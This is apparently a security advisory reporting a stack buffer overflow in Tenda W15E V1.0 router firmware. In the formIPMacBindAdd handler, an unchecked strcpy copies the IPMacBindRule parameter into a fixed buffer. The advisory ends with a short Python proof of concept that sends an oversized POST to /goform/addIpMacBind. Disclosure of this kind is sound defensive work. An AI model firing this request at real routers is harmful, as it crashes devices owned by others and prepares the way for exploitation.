## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formIPMacBindAdd` function. The `rules` variable receives the `IPMacBindRule` parameter from a POST request and is passed to function `ipMacBindListStore` as `listStr`. 

![image-20240417110001592](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417110001592.png)

In function `ipMacBindListStore`, the `listStr` is directly assigned to `inputList`. However, since the user can control the input of `IPMacBindRule`, the statement `strcpy((char *)&inputList, (const char *)listStr);` can cause a buffer overflow. The user-provided  `IPMacBindRule` can exceed the capacity of the `inputList` array, triggering this security vulnerability.

![image-20240417110045932](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417110045932.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addIpMacBind"
payload = b"a"*2000

data = {
        'IPMacBindRule':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
